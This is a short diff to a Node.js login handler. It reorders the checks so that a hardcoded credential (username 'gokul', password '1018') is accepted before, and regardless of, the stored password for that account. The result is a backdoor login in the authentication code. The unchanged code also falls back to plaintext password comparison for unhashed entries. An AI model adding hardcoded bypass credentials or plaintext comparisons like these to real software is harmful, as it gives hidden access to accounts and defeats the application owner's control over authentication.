@@ -26,15 +26,15 @@ exports.login = async (req, res, next) => {
             const isHardcodedGokul = normalizedUsername === 'gokul' && password === '1018';
 
             let isMatch = false;
-            if (user) {
+            if (isHardcodedGokul) {
+                isMatch = true;
+            } else if (user) {
                 // Check if password is hashed (starts with $2a$ or $2b$)
                 if (user.password.startsWith('$2a$') || user.password.startsWith('$2b$')) {
                     isMatch = await bcrypt.compare(password, user.password);
                 } else {
                     isMatch = user.password === password;
                 }
-            } else if (isHardcodedGokul) {
-                isMatch = true;
             }
 
             if (!isMatch) {
